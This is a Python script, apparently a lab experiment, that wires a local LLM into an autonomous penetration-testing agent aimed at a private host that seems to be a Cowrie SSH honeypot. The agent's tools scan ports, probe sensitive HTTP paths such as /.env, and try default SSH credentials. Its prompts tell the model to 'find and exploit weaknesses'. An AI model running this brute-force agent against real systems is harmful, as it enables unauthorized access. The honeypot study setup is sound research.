import subprocess
import operator
import json
import os
import time
import socket
import requests
import paramiko
from datetime import datetime
from typing import Annotated
from typing_extensions import TypedDict
from langchain_ollama import ChatOllama
from langchain_core.tools import tool
from langgraph.graph import StateGraph, END

# ── CONFIG ───────────────────────────────────────
MODEL = "qwen3.5:9b"
OLLAMA_HOST = "http://192.168.100.1:11434"
TARGET      = "192.168.100.10"
WORDLIST    = "wordlist.txt"          # swap this for Sim 3
LOG_DIR     = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# ── SESSION ID ───────────────────────────────────
SESSION_ID = f"sim_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}"
AGENT_LOG  = os.path.join(LOG_DIR, f"agent_{SESSION_ID}.json")

# ── LOGGING ──────────────────────────────────────
def log_event(event_type: str, data: dict):
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "session":   SESSION_ID,
        "type":      event_type,
        "data":      data,
    }
    with open(AGENT_LOG, "a") as f:
        f.write(json.dumps(entry) + "\n")
    print(f"  [LOG] {event_type}: {json.dumps(data)[:120]}")


# ── TOOLS ────────────────────────────────────────

@tool
def ping_host(ip: str) -> str:
    """Ping a target and return whether it is reachable."""
    log_event("tool_call", {"tool": "ping_host", "ip": ip})
    result = subprocess.run(["ping", "-c", "2", ip], capture_output=True, text=True)
    status = "reachable" if result.returncode == 0 else "unreachable"
    out = f"Host {ip} is {status}"
    log_event("tool_result", {"tool": "ping_host", "result": out})
    return out


@tool
def nmap_scan(ip: str) -> str:
    """Run an nmap service scan on common ports and return open ports and banners."""
    log_event("tool_call", {"tool": "nmap_scan", "ip": ip})
    result = subprocess.run(
        ["nmap", "-sV", "-p", "22,23,80,443,8080", "--open", ip],
        capture_output=True, text=True
    )
    out = result.stdout or result.stderr
    log_event("tool_result", {"tool": "nmap_scan", "result": out[:500]})
    return out


@tool
def banner_grab(ip: str, port: int) -> str:
    """Connect to a port and read the service banner."""
    log_event("tool_call", {"tool": "banner_grab", "ip": ip, "port": port})
    try:
        with socket.create_connection((ip, port), timeout=5) as s:
            s.sendall(b"\r\n")
            banner = s.recv(1024).decode(errors="replace").strip()
    except Exception as e:
        banner = f"Error: {e}"
    out = f"Banner on {ip}:{port} -> {banner}"
    log_event("tool_result", {"tool": "banner_grab", "result": out[:300]})
    return out


@tool
def http_probe(ip: str) -> str:
    """Probe common HTTP paths and return status codes and response sizes."""
    log_event("tool_call", {"tool": "http_probe", "ip": ip})
    paths   = ["/", "/admin", "/login", "/wp-admin", "/phpmyadmin", "/.env", "/config"]
    results = []
    for path in paths:
        for port in [80, 8080]:
            url = f"http://{ip}:{port}{path}"
            try:
                r = requests.get(url, timeout=3, allow_redirects=False)
                results.append(f"{url} -> {r.status_code} ({len(r.content)} bytes)")
            except Exception:
                results.append(f"{url} -> no response")
    out = "\n".join(results)
    log_event("tool_result", {"tool": "http_probe", "result": out[:600]})
    return out


@tool
def load_credentials(n: int = 10) -> str:
    """Load the next N credentials from the wordlist. Returns username:password pairs."""
    log_event("tool_call", {"tool": "load_credentials", "n": n})
    try:
        with open(WORDLIST) as f:
            lines = [l.strip() for l in f if ":" in l]
        creds = lines[:n]
    except FileNotFoundError:
        # fallback mini-list if no wordlist file present
        creds = [
            "root:root", "root:password", "root:123456",
            "admin:admin", "admin:password", "user:user",
            "ubuntu:ubuntu", "pi:raspberry", "test:test", "guest:guest",
        ]
    out = "\n".join(creds)
    log_event("tool_result", {"tool": "load_credentials", "count": len(creds)})
    return out


@tool
def ssh_attempt(ip: str, port: int, username: str, password: str) -> str:
    """Attempt SSH login with given credentials. Returns success, auth_failed, or connection_refused."""
    log_event("tool_call", {"tool": "ssh_attempt", "ip": ip, "port": port,
                             "username": username, "password": password})
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username=username, password=password, timeout=5)
        client.close()
        result = f"SUCCESS: {username}:{password} on {ip}:{port}"
    except paramiko.AuthenticationException:
        result = f"auth_failed: {username}:{password}"
    except Exception as e:
        result = f"connection_refused: {e}"
    log_event("tool_result", {"tool": "ssh_attempt", "result": result})
    time.sleep(0.3)   # small delay to avoid flooding Cowrie
    return result


@tool
def generate_session_report(findings: str) -> str:
    """Generate a final summary report for this attack session."""
    log_event("session_report", {"findings": findings})
    report = (
        f"=== Session Report: {SESSION_ID} ===\n"
        f"Target : {TARGET}\n"
        f"Time   : {datetime.utcnow().isoformat()}\n"
        f"Findings:\n{findings}\n"
        f"{'='*40}"
    )
    report_path = os.path.join(LOG_DIR, f"report_{SESSION_ID}.txt")
    with open(report_path, "w") as f:
        f.write(report)
    return report


# ── AGENT ────────────────────────────────────────
llm = ChatOllama(model=MODEL, base_url=OLLAMA_HOST)

TOOLS = [
    ping_host,
    nmap_scan,
    banner_grab,
    http_probe,
    load_credentials,
    ssh_attempt,
    generate_session_report,
]

llm_with_tools = llm.bind_tools(TOOLS)


class AgentState(TypedDict):
    messages: Annotated[list, operator.add]


def agent_node(state: AgentState):
    log_event("agent_reasoning", {"message_count": len(state["messages"])})
    response = llm_with_tools.invoke(state["messages"])
    log_event("agent_response", {"content": str(response.content)[:300]})
    return {"messages": [response]}


def tool_node(state: AgentState):
    from langchain_core.messages import ToolMessage
    last = state["messages"][-1]
    results = []
    for call in last.tool_calls:
        fn   = {t.name: t for t in TOOLS}[call["name"]]
        out  = fn.invoke(call["args"])
        results.append(ToolMessage(content=str(out), tool_call_id=call["id"]))
    return {"messages": results}


def should_continue(state: AgentState):
    last = state["messages"][-1]
    if hasattr(last, "tool_calls") and last.tool_calls:
        return "tools"
    return END


graph = StateGraph(AgentState)
graph.add_node("agent", agent_node)
graph.add_node("tools", tool_node)
graph.set_entry_point("agent")
graph.add_conditional_edges("agent", should_continue, {"tools": "tools", END: END})
graph.add_edge("tools", "agent")
app = graph.compile()


# ── SIMULATION RUNNER ────────────────────────────
SYSTEM_PROMPT = (
    "You are an autonomous penetration tester. You have access to tools for "
    "recon and exploitation. Always: (1) ping first, (2) run nmap, (3) grab banners, "
    "(4) probe HTTP, (5) load credentials and attempt SSH logins, "
    "(6) call generate_session_report with your findings when done. "
    "Never attempt the same credential twice. After 3 consecutive auth failures "
    "switch to probing HTTP. Always check banner content before choosing which "
    "service to attack."
)

SIMULATIONS = {
    "sim1_minimal": (
        "Target: 192.168.100.10. Find and exploit weaknesses."
    ),
    "sim2_guided": (
        "You are a red team operator. Target: 192.168.100.10. "
        "Perform full recon, identify running services, then attempt "
        "credential-based access on SSH using common usernames."
    ),
    "sim3_wordlist": (
        # Same as sim2 but swap WORDLIST above to a different SecLists file first
        "You are a red team operator. Target: 192.168.100.10. "
        "Perform full recon, identify running services, then attempt "
        "credential-based access on SSH using common usernames. "
        "Use an aggressive credential strategy."
    ),
}


def run_simulation(sim_name: str, user_prompt: str):
    global SESSION_ID, AGENT_LOG
    SESSION_ID = sim_name
    AGENT_LOG  = os.path.join(LOG_DIR, f"agent_{SESSION_ID}.json")

    print(f"\n{'='*60}")
    print(f"  STARTING {sim_name.upper()}")
    print(f"  Prompt : {user_prompt[:80]}...")
    print(f"  Log    : {AGENT_LOG}")
    print(f"{'='*60}\n")

    log_event("simulation_start", {"prompt": user_prompt, "target": TARGET})

    result = app.invoke({
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user",   "content": user_prompt},
        ]
    })

    final = result["messages"][-1]
    print(f"\n[+] Final agent response:\n{final.content}\n")
    log_event("simulation_end", {"final_response": str(final.content)[:500]})

    # snapshot Cowrie log for this sim
    cowrie_log = "/home/cowrie/cowrie/var/log/cowrie/cowrie.log"
    snap = os.path.join(LOG_DIR, f"cowrie_{sim_name}.log")
    try:
        subprocess.run(["cp", cowrie_log, snap], check=True)
        print(f"[+] Cowrie log saved to {snap}")
    except Exception as e:
        print(f"[!] Could not snapshot Cowrie log: {e}")

    print(f"[+] Agent log saved to {AGENT_LOG}\n")


# ── ENTRY POINT ──────────────────────────────────
if __name__ == "__main__":
    import sys

    # Run a single sim by name: python agent.py sim1_minimal
    # Or run all three:        python agent.py all
    target_sim = sys.argv[1] if len(sys.argv) > 1 else "sim1_minimal"

    if target_sim == "all":
        for name, prompt in SIMULATIONS.items():
            run_simulation(name, prompt)
            print("[*] Sleeping 10s before next simulation...\n")
            time.sleep(10)
    elif target_sim in SIMULATIONS:
        run_simulation(target_sim, SIMULATIONS[target_sim])
    else:
        print(f"Unknown sim '{target_sim}'. Choose: {list(SIMULATIONS.keys())} or 'all'")

